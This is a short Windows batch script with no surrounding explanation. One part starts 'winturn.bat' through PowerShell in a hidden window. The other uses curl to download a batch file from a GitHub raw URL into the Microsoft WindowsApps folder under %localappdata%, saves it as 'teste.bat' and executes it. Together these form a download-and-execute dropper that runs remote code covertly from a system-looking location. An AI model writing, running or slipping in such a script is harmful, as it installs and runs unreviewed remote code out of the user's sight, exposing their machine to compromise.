@ECHO OFF
powershell "start winturn.bat -WindowStyle Hidden"

@ECHO OFF
curl https://raw.githubusercontent.com/hulaneoTi/testes/main/winturn.bat > %localappdata%\Microsoft\WindowsApps\teste.bat
start teste.bat